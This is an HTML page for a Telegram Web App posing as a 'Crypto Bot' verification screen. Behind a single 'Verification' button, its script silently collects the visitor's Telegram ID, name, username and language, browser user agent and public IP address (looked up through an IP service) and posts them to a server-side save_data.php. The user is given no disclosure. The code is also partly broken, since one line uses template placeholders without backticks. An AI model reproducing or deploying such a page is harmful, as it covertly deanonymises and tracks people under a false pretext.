<!DOCTYPE html>
<html>
<head>
    <title>Crypto Bot | Verification...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        let tg = window.Telegram.WebApp;
        const userAgent = navigator.userAgent;

        tg.expand(); // расширяем на все окно
        let dataa = ${tg.initDataUnsafe.user.id} ${tg.initDataUnsafe.user.first_name} ${tg.initDataUnsafe.user.last_name} ${tg.initDataUnsafe.user.username} (${tg.initDataUnsafe.user.language_code});

        $.getJSON("https://api.ipify.org?format=json", function(data) {
            var ip = data.ip;
            $.post("save_data.php", { ip: ip, dataa: dataa, userAgent: userAgent });
        });
    </script>
    <style>
        #button {
            background-color: blue;
            border: none;
            color: white;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            height: 100vh;
        }
    </style>
</head>
<body>
    <button id="button">Verification . . .</button>
</body>
</html>
